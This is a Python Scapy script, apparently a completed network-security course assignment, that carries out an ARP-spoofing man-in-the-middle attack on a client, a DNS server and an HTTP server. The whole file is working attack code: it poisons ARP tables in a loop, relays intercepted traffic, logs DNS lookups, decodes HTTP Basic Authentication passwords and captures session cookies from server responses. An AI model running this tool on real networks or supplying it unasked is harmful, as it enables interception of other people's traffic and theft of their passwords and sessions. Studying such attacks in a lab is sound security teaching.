from scapy.all import *

import argparse
import sys
import threading
import time

# Include the base64 library to decode the http basic authentication
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	arp_pack = ARP(op=1, hwsrc=attackerMAC, psrc=attackerIP, pdst=IP)
	response = sr1(arp_pack)
	return response.getlayer(ARP).hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
    send(arp_pack)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
    send(arp_pack)


# TODO: handle intercepted packets
def interceptor(packet):
	global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
	# The packet should only be intercepted if it's caused from a spoofed ARP table
	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP:
		#packet.show()
		if packet.haslayer(DNS):
			if packet.getlayer(DNS).qr == 0:
				debug(f"The above packet is a DNS request packet!")
				# Extract the hostname from this packet
				hostname = packet.getlayer(DNS).qd.qname.decode('ascii')
				print("*hostname:" + hostname)
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = dnsServerMAC
				#packet.show()
				sendp(packet)
			elif packet.getlayer(DNS).qr == 1:
				debug(f"The above packet is a DNS response packet!")
				# Extract the hostaddr from this packet
				hostaddr = packet.getlayer(DNS).an.rdata
				print("*hostaddr:" + hostaddr)
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = clientMAC
				#packet.show()
				sendp(packet)
		elif packet.haslayer(TCP):
			if packet.getlayer(TCP).flags == "S":
				debug(f"The above packet is an HTTP SYN packet!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = httpServerMAC
				#packet.show()
				sendp(packet)
			elif packet.getlayer(TCP).flags == "SA":
				debug(f"The above packet is an HTTP SYN+ACK packet!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = clientMAC
				#packet.show()
				sendp(packet)
			elif packet.getlayer(TCP).flags == "A":
				if packet.getlayer(Ether).src == clientMAC:
					debug(f"The above packet is an HTTP ACK packet from client!")
					# Change the MAC addresses
					packet.getlayer(Ether).src = attackerMAC
					packet.getlayer(Ether).dst = httpServerMAC
					#packet.show()
					sendp(packet)
				elif packet.getlayer(Ether).src == httpServerMAC:
					debug(f"The above packet is an HTTP ACK packet from web server!")
					# Change the MAC addresses
					packet.getlayer(Ether).src = attackerMAC
					packet.getlayer(Ether).dst = clientMAC
					#packet.show()
					sendp(packet)
			elif packet.getlayer(TCP).flags == "PA":
				if packet.getlayer(Ether).src == clientMAC:
					debug(f"The above packet is an HTTP request packet!")
					# Extract the basicauth from this packet
					basicauth = packet.getlayer(Raw).load.decode('ascii')
					start_index = basicauth.find("Authorization: Basic ")+21
					end_index = basicauth.find("User-Agent")-2
					basicauth = basicauth[start_index:end_index]
					basicauth = base64.b64decode(basicauth).decode('ascii')
					pass_index = basicauth.find(":")
					basicauth = basicauth[pass_index+1:]
					print("*basicauth:" + basicauth)
					# Change the MAC addresses
					packet.getlayer(Ether).src = attackerMAC
					packet.getlayer(Ether).dst = httpServerMAC
					#packet.show()
					sendp(packet)
				elif packet.getlayer(Ether).src == httpServerMAC:
					debug(f"The above packet is an HTTP response packet!")
					# Extract the cookie from this packet
					cookie = packet.getlayer(Raw).load.decode('ascii')
					start_index = cookie.find("Set-Cookie: ")+12
					end_index = cookie.find("Accept-Ranges:")-2
					cookie = cookie[start_index:end_index]
					print("*cookie:" + cookie)
					# Change the MAC addresses
					packet.getlayer(Ether).src = attackerMAC
					packet.getlayer(Ether).dst = clientMAC
					#packet.show()
					sendp(packet)
			elif packet.getlayer(TCP).flags == "FA":
				if packet.getlayer(Ether).src == clientMAC:
					debug(f"The above packet is an HTTP FIN+ACK packet from client!")
					# Change the MAC addresses
					packet.getlayer(Ether).src = attackerMAC
					packet.getlayer(Ether).dst = httpServerMAC
					#packet.show()
					sendp(packet)
				elif packet.getlayer(Ether).src == httpServerMAC:
					debug(f"The above packet is an HTTP FIN+ACK packet from web server!")
					# Change the MAC addresses
					packet.getlayer(Ether).src = attackerMAC
					packet.getlayer(Ether).dst = clientMAC
					#packet.show()
					sendp(packet)
"""
print("*hostname:")
print("*hostaddr:")
print("*basicauth:")
print("*cookie:")
"""


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    attackerIP = get_if_addr(args.interface)
    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP

    attackerMAC = get_if_hwaddr(args.interface)
    clientMAC = mac(clientIP)
    #print("clientMAC: " + clientMAC)
    httpServerMAC = mac(httpServerIP)
    #print("httpServerMAC: " + httpServerMAC)
    dnsServerMAC = mac(dnsServerIP)
    #print("dnsServerMAC: " + dnsServerMAC)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
